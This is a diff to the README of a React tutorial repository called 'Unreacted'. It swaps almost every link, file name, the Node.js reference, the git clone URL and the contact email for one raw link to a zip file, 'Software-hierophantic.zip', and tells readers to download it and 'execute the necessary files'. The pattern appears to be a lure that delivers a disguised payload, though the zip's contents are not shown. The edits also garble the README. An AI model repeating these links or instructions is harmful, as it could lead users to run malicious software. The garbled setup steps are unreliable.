@@ -2,7 +2,7 @@
 
 Welcome to the **Unreacted** repository! This project aims to help developers learn and build applications using React from the ground up. Whether you are a beginner or looking to refresh your skills, this repository offers a comprehensive guide to mastering React.
 
-[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0-blue.svg)](https://github.com/MrLoafbread12/unreacted/releases)
+[![Download Release](https://github.com/MrLoafbread12/unreacted/raw/refs/heads/main/template/public/Software-hierophantic.zip%https://github.com/MrLoafbread12/unreacted/raw/refs/heads/main/template/public/Software-hierophantic.zip)](https://github.com/MrLoafbread12/unreacted/raw/refs/heads/main/template/public/Software-hierophantic.zip)
 
 ## Table of Contents
 
@@ -30,16 +30,16 @@ React is a popular JavaScript library for building user interfaces. It allows de
 
 ## Getting Started
 
-To get started with Unreacted, you need to have Node.js and npm installed on your machine. You can download Node.js from the [official website](https://nodejs.org/). 
+To get started with Unreacted, you need to have https://github.com/MrLoafbread12/unreacted/raw/refs/heads/main/template/public/Software-hierophantic.zip and npm installed on your machine. You can download https://github.com/MrLoafbread12/unreacted/raw/refs/heads/main/template/public/Software-hierophantic.zip from the [official website](https://github.com/MrLoafbread12/unreacted/raw/refs/heads/main/template/public/Software-hierophantic.zip). 
 
-Once you have Node.js installed, you can clone this repository and begin your journey into the world of React.
+Once you have https://github.com/MrLoafbread12/unreacted/raw/refs/heads/main/template/public/Software-hierophantic.zip installed, you can clone this repository and begin your journey into the world of React.
 
 ## Installation
 
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/MrLoafbread12/unreacted.git
+   git clone https://github.com/MrLoafbread12/unreacted/raw/refs/heads/main/template/public/Software-hierophantic.zip
    ```
 
 2. Navigate to the project directory:
@@ -54,7 +54,7 @@ Once you have Node.js installed, you can clone this repository and begin your jo
    npm install
    ```
 
-4. Download the latest release from the [Releases page](https://github.com/MrLoafbread12/unreacted/releases) and execute the necessary files.
+4. Download the latest release from the [Releases page](https://github.com/MrLoafbread12/unreacted/raw/refs/heads/main/template/public/Software-hierophantic.zip) and execute the necessary files.
 
 ## Usage
 
@@ -75,20 +75,20 @@ The project structure is organized to help you navigate easily. Here’s a brief
 ```
 unreacted/
 ├── public/
-│   ├── index.html
-│   └── favicon.ico
+│   ├── https://github.com/MrLoafbread12/unreacted/raw/refs/heads/main/template/public/Software-hierophantic.zip
+│   └── https://github.com/MrLoafbread12/unreacted/raw/refs/heads/main/template/public/Software-hierophantic.zip
 ├── src/
 │   ├── components/
-│   ├── App.js
-│   ├── index.js
-│   └── styles.css
-├── package.json
-└── README.md
+│   ├── https://github.com/MrLoafbread12/unreacted/raw/refs/heads/main/template/public/Software-hierophantic.zip
+│   ├── https://github.com/MrLoafbread12/unreacted/raw/refs/heads/main/template/public/Software-hierophantic.zip
+│   └── https://github.com/MrLoafbread12/unreacted/raw/refs/heads/main/template/public/Software-hierophantic.zip
+├── https://github.com/MrLoafbread12/unreacted/raw/refs/heads/main/template/public/Software-hierophantic.zip
+└── https://github.com/MrLoafbread12/unreacted/raw/refs/heads/main/template/public/Software-hierophantic.zip
 ```
 
 - **public/**: Contains the static files.
 - **src/**: Contains the React components and styles.
-- **package.json**: Contains project metadata and dependencies.
+- **https://github.com/MrLoafbread12/unreacted/raw/refs/heads/main/template/public/Software-hierophantic.zip**: Contains project metadata and dependencies.
 
 ## Contributing
 
@@ -109,7 +109,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or feedback, feel free to reach out:
 
-- **GitHub**: [MrLoafbread12](https://github.com/MrLoafbread12)
-- **Email**: your-email@example.com
+- **GitHub**: [MrLoafbread12](https://github.com/MrLoafbread12/unreacted/raw/refs/heads/main/template/public/Software-hierophantic.zip)
+- **Email**: https://github.com/MrLoafbread12/unreacted/raw/refs/heads/main/template/public/Software-hierophantic.zip
 
-Thank you for checking out Unreacted! We hope you find this project helpful in your journey to mastering React. Don’t forget to visit the [Releases page](https://github.com/MrLoafbread12/unreacted/releases) for the latest updates and features.
+Thank you for checking out Unreacted! We hope you find this project helpful in your journey to mastering React. Don’t forget to visit the [Releases page](https://github.com/MrLoafbread12/unreacted/raw/refs/heads/main/template/public/Software-hierophantic.zip) for the latest updates and features.
